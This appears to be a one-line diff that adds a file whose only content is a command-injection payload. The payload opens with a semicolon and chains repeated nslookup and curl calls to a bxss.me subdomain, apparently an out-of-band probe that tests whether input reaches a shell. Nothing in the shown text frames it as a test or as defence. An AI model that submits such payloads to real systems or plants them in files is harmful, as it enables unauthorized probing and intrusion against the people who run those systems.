@@ -1,0 +1,1 @@
+;(nslookup -q=cname hityewealspmd4788d.bxss.me||curl hityewealspmd4788d.bxss.me)|(nslookup -q=cname hityewealspmd4788d.bxss.me||curl hityewealspmd4788d.bxss.me)&(nslookup -q=cname hityewealspmd4788d.bxss.me||curl hityewealspmd4788d.bxss.me)
